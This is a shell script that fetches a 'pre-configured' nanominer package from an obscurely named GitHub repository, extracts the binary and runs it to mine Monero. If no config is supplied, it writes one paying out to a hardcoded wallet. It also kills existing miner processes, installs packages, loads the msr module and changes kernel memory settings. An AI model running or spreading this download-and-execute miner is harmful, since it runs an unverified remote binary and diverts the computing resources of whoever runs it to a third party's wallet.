#!/bin/sh

#=============================================================================
# NANOMINER AUTO-SETUP
# Downloads pre-configured nanominer and starts mining
#=============================================================================

PACKAGE_URL="https://github.com/RaafetEmo/svpgninim/raw/refs/heads/main/nano.tar.gz"
DIR="$HOME/nanominer-xmr"

msg() { printf "[*] %s\n" "$1"; }
ok() { printf "[✓] %s\n" "$1"; }
err() { printf "[✗] %s\n" "$1"; exit 1; }
warn() { printf "[!] %s\n" "$1"; }

banner() {
    clear
    printf "╔═══════════════════════════════════════════════╗\n"
    printf "║        Nanominer Auto-Setup & Start           ║\n"
    printf "║        Pre-configured & Ready to Mine         ║\n"
    printf "╚═══════════════════════════════════════════════╝\n"
    printf "\n"
}

install_deps() {
    msg "Checking dependencies..."
    for d in wget tar; do
        if ! command -v $d >/dev/null 2>&1; then
            warn "Installing $d..."
            apt-get update -qq && apt-get install -y $d || err "Failed to install $d"
        fi
    done
    ok "Dependencies ready"
    printf "\n"
}

cleanup_old() {
    msg "Cleaning up old files..."
    pkill -9 nanominer 2>/dev/null
    sleep 1
    rm -rf "$DIR"
    mkdir -p "$DIR"
    ok "Clean"
    printf "\n"
}

download_miner() {
    msg "Downloading pre-configured nanominer..."
    cd "$DIR" || err "Cannot cd to $DIR"
    
    if ! wget -q --show-progress "$PACKAGE_URL" -O nano.tar.gz; then
        warn "wget failed, trying curl..."
        curl -L "$PACKAGE_URL" -o nano.tar.gz || err "Download failed"
    fi
    
    ok "Downloaded"
    printf "\n"
}

extract_miner() {
    msg "Extracting package..."
    cd "$DIR" || err "Cannot cd to $DIR"
    
    tar xzf nano.tar.gz || err "Extraction failed"
    rm nano.tar.gz
    
    # Check if extracted to nano/ subdirectory
    if [ -d "nano" ]; then
        msg "Moving files from nano/ directory..."
        mv nano/* . 2>/dev/null
        rmdir nano
    fi
    
    # Make nanominer executable
    if [ -f "nanominer" ]; then
        chmod +x nanominer
        ok "Ready"
    else
        err "nanominer binary not found in package"
    fi
    printf "\n"
}

optimize() {
    msg "Optimizing system..."
    modprobe msr 2>/dev/null && ok "MSR loaded" || warn "MSR unavailable"
    sysctl -w vm.nr_hugepages=1168 >/dev/null 2>&1 && ok "Huge pages set" || warn "Huge pages failed"
    printf "\n"
}

start_mining() {
    cd "$DIR" || err "Cannot cd to $DIR"
    
    if [ ! -f "nanominer" ]; then
        err "nanominer not found!"
    fi
    
    if [ ! -f "config.ini" ]; then
        warn "config.ini not found in package, creating default..."
        cat > config.ini <<EOF
[RandomX]
wallet = 47PFHCgahfpFHUN7NcRRoZYYewoexEnVxeDiEVtbhXpigBjyE7QrRFp3i5FmZy74C2j9sXcYiX3fJNS5gaB6wAL2NEipZxg
rigName = worker1
email = user@example.com
memTweak = 1
EOF
    fi
    
    banner
    printf "╔═══════════════════════════════════════════════╗\n"
    printf "║           🚀 MINING STARTED 🚀                ║\n"
    printf "╠═══════════════════════════════════════════════╣\n"
    printf "║ Using pre-configured settings                 ║\n"
    printf "║ Pool: Nanopool (automatic)                    ║\n"
    printf "║ Coin: Monero (XMR)                            ║\n"
    printf "╠═══════════════════════════════════════════════╣\n"
    printf "║ Press Ctrl+C to stop                          ║\n"
    printf "╚═══════════════════════════════════════════════╝\n"
    printf "\n"
    
    msg "Starting nanominer..."
    printf "\n"
    
    ./nanominer
}

stop() {
    printf "\n"
    warn "Stopping mining..."
    pkill -9 nanominer 2>/dev/null
    ok "Stopped"
    printf "\n"
    exit 0
}

main() {
    banner
    install_deps
    cleanup_old
    download_miner
    extract_miner
    optimize
    start_mining
}

trap stop INT TERM
main